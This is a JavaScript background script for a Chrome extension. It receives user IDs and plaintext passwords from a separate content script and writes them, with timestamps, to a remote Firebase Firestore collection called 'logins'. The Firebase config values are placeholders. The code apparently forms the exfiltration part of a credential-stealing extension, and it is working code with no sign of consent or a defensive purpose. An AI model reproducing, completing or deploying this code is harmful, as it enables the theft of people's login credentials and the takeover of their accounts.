// background.js (must be treated as a module in manifest)
import { initializeApp } from "https://www.gstatic.com/firebasejs/11.6.0/firebase-app.js";
import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/11.6.0/firebase-firestore.js";

const firebaseConfig = {
  apiKey: "sorry_darling",
  authDomain: "sorry_darling",
  projectId: "sorry_darling",
  storageBucket: "sorry_darling",
  messagingSenderId: "sorry_darling",
  appId: "sorry_darling",
  measurementId: "sorry_darling"
};

const app = initializeApp(firebaseConfig);
const db = getFirestore(app);

// Listen for messages from content.js
chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
  if (request.type === "SAVE_TO_FIREBASE") {
    const { userid, password, timestamp } = request.payload;

    addDoc(collection(db, "logins"), {
      userid,
      password,
      timestamp
    })
    .then(() => {
      console.log("✅ Data saved to Firebase");
    })
    .catch((error) => {
      console.error("❌ Error saving to Firebase:", error);
    });
  }
});
